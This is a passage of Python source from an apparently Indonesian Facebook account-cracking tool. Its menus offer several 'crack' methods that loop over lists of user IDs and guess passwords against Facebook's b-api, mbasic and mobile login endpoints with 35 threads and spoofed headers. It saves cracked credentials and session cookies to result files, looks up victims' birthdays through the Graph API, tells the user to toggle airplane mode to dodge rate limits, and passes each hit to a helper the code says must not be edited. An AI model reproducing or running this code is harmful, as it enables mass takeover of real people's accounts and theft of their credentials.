        print(Q+"[5] Mbasic V2 "+C+"Pro"+Q+" ( Slow Crack  )");time.sleep(0.02)
        print(Q+"[6] Mbasic V3 "+C+"Pro"+Q+" ( Fast Crack  )");time.sleep(0.02)
        print(Q+"[7] Mobile V1 "+C+"Pro"+Q+" ( Fast Crack  ) ( "+I+"Recommended"+Q+"  )\n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n"+war+M+"Silahkan Pilih Metode Login !")
        jalan(war+M+"Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat")
        print(Q+"[1] B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(Q+"[2] B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(Q+"[3] Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(Q+"[4] Mbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(Q+"[5] Mobile V1 "+C+"Pro"+Q+" ( Fast Crack  ) ( "+I+"Recommended"+Q+"  )\n");time.sleep(0.02)

    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        cjj = open(".paww", "w")
        print('\n\n'+war+'Silahkan Pilih Password (Default/Manual/Gabungan)-(D/m/g) ?')
        zk = input(inp+'Pilih : ')
        if zk in ('m','M','Manual','manual'):
            while True:
                jalan(war+"Contoh Password : sayang,123456")
                pwx = input('\n'+inp+"Masukan Password : ")
                jalan("%sPassword Yang DiGunakan : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Isi Password Dengan Benar !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimal 6 Huruf !!")
                else:
                    tanya_opsi()
                    pilih_alam()
                    self.menu_crack_m()
                    jm = input(war+"Pilih :")
                    if jm == "":
                       jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                       crackmenu().passmenu()
                    elif jm == "1" or jm == "01":
                       self.pro_ses()
                       def api_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.api, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       api_m(pwx.split(','))
                       break

                    elif jm == "2" or jm == "02":
                       self.pro_ses()
                       def apiv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.__api__, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       apiv2_m(pwx.split(','))
                       break

                    elif jm == "3" or jm == "03":
                       self.pro_ses()
                       def mbasic_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mbasic, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       mbasic_m(pwx.split(','))
                       break

                    elif jm == "4" or jm == "04":
                       self.pro_ses()
                       def mbasicv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mbasicv1, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mbasicv2_m(pwx.split(','))
                       break
                    elif jm == "5" or jm == "05":
                       pilih_infong()
                       self.pro_ses()
                       def mobile_n(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mobile_,userid,zsc )
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mobile_n(pwx.split(','))
                       break
                    else:
                       jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                       crackmenu(isifile).passmenu(isifile)

        elif zk in ('d', 'D','Default','default'):
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Pilih :")
                if jm == "":
                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
#                   self.KangCOLMEXXXX()
                else:
                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        elif zk in ('G', 'g','Gabung','gabung','gabungan'):
                gabung_pw()
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Pilih :")
                if jm == "":
                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
                else:
                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        else:
            print(war+'Isi Dengan Benar !')
            time.sleep(2)
            crackmenu(isifile).passmenu(isifile)
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
#            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                ua54 = open(".ua","r").read()
            except:
                ua54 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                                      'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
                                      'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua54,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s[%s%s%s] %s%s|%s                 %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                bokep_japan_yang_terbaru("OK", user, pw, "-") # jangan diedit check akun tap yes
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    token = open(".login.txt").read()
                    ttl = requests.get("https://graph.facebook.com/%s?access_token=%s"%(user, token)).json()["birthday"]
                    month, day, year = ttl.split("/")
                    month = bulan_ttl[month]
                    dob = ('%s %s %s'%(day, month, year))
                except Exception as e:
                    dob = (' ')
                    if opsii == "y" or "y" == opsii:
#                       sttt(user, pw, dob)
                       try:
                           log_hasill(user, pw, str(dob))
                       except:
                           log_hasill(user, pw, "")
                    else:
                       print ('\r%s[%s%s%s] %s%s|%s | %s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q));play_mpv('assalamualaikum.mp3')
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    cp.append(wrt)
                    bokep_japan_yang_terbaru("CP", user, pw, dob)
                    break
                    continue
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()

#                break
 #               continue
        loop += 1
    def mabasic(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = logger(fl.get("id"),i,"https://mbasic.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasic(fl)
    def mabasicv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api_1(fl.get("id"), i)
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasicv1(fl)

    def apiv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q);play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

    def __api__(self, user, __yan__):
        global ok,cp,loop,opsii
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                _kontol = open('.ua', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] Hidup Matikan Mode Pesawat !!!'%(Q,K,Q)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r%s[%sOK%s]%s %s|%s|%s                 %s\n' % (Q,I,Q,I,user,pw,coki))
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                ttl_ = ("%s %s %s"%(day, month, year))
                if opsii == "y" or "y" == opsii:
                   try:
                       log_hasill(user, pw, str(dob))
                   except:
                       log_hasill(user, pw, "")
                else:
                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q));play_mpv('assalamualaikum.mp3')
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s%s' % (user,pw,ttl_)
                cp.append(wrt)
                open('Hasil/CP-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()


    def mobile_(self, user, kiky__gtg):
        global ok,cp,loop,infoong
        for pw in kiky__gtg:
            pw = pw.lower()
            session = requests.Session()
            session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
#            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False);garentod(2)
            if 'c_user' in session.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
                zczc = ('\r%s[%sOK%s]%s %s|%s|%s                 ' % (Q,I,Q,I,user,pw,coki));play_mpv('assalamualaikum.mp3')
                if infoong == "y":
                   cek_cookies_by_risky(user, coki, zczc)
                else:
                   print(zczc)
                akun_ok(user, pw, coki)
                break
            elif 'checkpoint' in session.cookies.get_dict():
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://m.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year));play_mpv('assalamualaikum.mp3')
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                    bokep_japan_yang_terbaru("AJG", user, pw, "")
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s[%sCP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw));play_mpv('assalamualaikum.mp3')
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                bokep_japan_yang_terbaru("AJG", user, pw, "")
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()





    def mobile__(self, uid, listpw):
                global ok, cp, loop
                sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
                try:
                        for pw in listpw:
                                pw = pw.lower()
                                ses = requests.Session()
                                ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                                r = ses.get("https://m.facebook.com/index.php")
                                payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/home.php"}
                                if "c_user" in ses.cookies.get_dict().keys():
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        print("\r%s[%sOK%s]%s %s|%s|%s%s"%(Q, I, Q, I, uid, pw, kuki, Q))
